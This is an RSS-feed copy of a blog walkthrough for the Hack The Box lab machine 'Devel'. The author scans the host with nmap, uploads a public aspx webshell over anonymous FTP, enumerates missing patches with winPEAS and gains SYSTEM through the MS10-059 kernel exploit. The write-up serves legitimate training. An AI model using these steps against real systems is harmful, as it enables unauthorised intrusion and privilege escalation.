+]]></description></item><item><title>HTB - Devel without MetaSploit</title><link>https://www.masoopy.com/htb-devel-without-metasploit/</link><pubDate>Tue, 16 Feb 2021 15:26:14 +0100</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-devel-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/images/2021/02/Devel_Logo.png" referrerpolicy="no-referrer">
+            </div><h2 id="intro">Intro</h2>
+<p>Pretty fast and obvious box. Let me guide through my pwn:</p>
+<h2 id="target">Target</h2>
+<p><a href="https://app.hackthebox.eu/machines/3" target="_blank" rel="noopener noreferrer">HTB - Devel</a></p>
+<h2 id="recon">Recon</h2>
+<p>Usual recon here, based on logo and info :</p>
+<ul>
+<li>Windows box ;</li>
+<li>Misc : FTP, <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank" rel="noopener noreferrer">Arbitrary file upload</a>.</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<p>We run our classic <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA nmap $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text"># Nmap 7.91 scan initiated Tue Feb 16 14:42:03 2021 as: nmap -T4 -A -p- -oA nmap $target_ip
+Nmap scan report for $target_ip
+Host is up (0.023s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst:
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   23.39 ms 10.10.14.1
+2   23.58 ms $target_ip
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 16 14:43:43 2021 -- 1 IP address (1 host up) scanned in 100.14 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>Our scan reveals an open FTP and a web server. Based on our initial recon, I guess we&rsquo;ll have to upload a malicious file via FTP and run it via the IIS web server!</p>
+<p>Before attacking, we&rsquo;ll check <code>searchsploit</code> for anything interesting, but nothing will come up.</p>
+<p>Let&rsquo;s start exploiting directly!</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The server is running IIS, so let&rsquo;s try to upload an <code>aspx</code> shell.</p>
+<h3 id="getting-initial-shell">Getting initial shell</h3>
+<p>A quick search brought me to <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx" target="_blank" rel="noopener noreferrer">this one</a>, I uploaded it inside the root of the web dir, and it worked !</p>
+<p></p>
+<p>Unfortunately, we are not <code>SYSTEM</code> and can&rsquo;t even access user&rsquo;s flag which seems to be called <code>babis</code>. It&rsquo;s time to escalate our privileges! But first, we should do recon from inside, let&rsquo;s upload the <code>winpeas.bat</code> file and execute as below :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">&#34;C:\inetpub\wwwroot\winPEAS.bat log&#34; 
+</code></pre></td></tr></table>
+</div>
+</div><p>This will generate a lot of info about Windows version, patches applied (or not), user rights, etc. This is a goldmine!</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Now, <a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener noreferrer">from what I learned</a>, a good way to escalate privileges is to look for missing patches and related vuln that would give those wanted priv.</p>
+<p>Our WinPEAS log file showed the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">&#34;Microsoft Windows 7 Enterprise   &#34; 
+   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
+MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
+MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
+MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
+MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
+MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
+MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
+MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
+MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
+MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
+MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
+MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
+MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
+MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
+MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
+MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
+MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
+MS04-020 patch is NOT installed 2K/SP4-POSIX)
+MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
+MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
+MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
+MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
+MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
+MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
+MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
+</code></pre></td></tr></table>
+</div>
+</div><p>Inside this list, I narrowed it down in order to match the system I was attacking : <code>Windows 7 Enterprise 6.1.7600 N/A Build 7600</code>, which is <code>SP0</code> according to a quick web search.</p>
+<p>Then I &ldquo;randomly&rdquo; (not totally randoms : it matches the target&rsquo;s OS) tried the <code>MS11-011</code> vuln, without luck.</p>
+<p>Then, I tried <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreferrer">MS10-059</a>.  For this one, I had to run a listener on my attack box, then run the malicious file like shown below :</p>
+<p></p>
+<p>NB : I simply uploaded the malicious file via FTP to the <code>wwwroot</code> dir.</p>
+<p>And it got me <code>SYSTEM</code> :</p>
+<p></p>
+<p>Now getting <code>user</code> and <code>root</code> flags was just a matter of browsing to the correct directories and printing the content of the files:</p>
+<p></p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>After my <a href="https://www.masoopy.com/htb-netmon/" target="_blank" rel="noopener noreferrer">debacle</a> from the last box, it felt awesome to be able to pwn this one easily. I feel my efforts are starting to pay off and that I begin to get the &ldquo;hang of it&rdquo;. Hacker&rsquo;s mind in coming, and it is good!</p>
+]]></description></item></channel></rss>
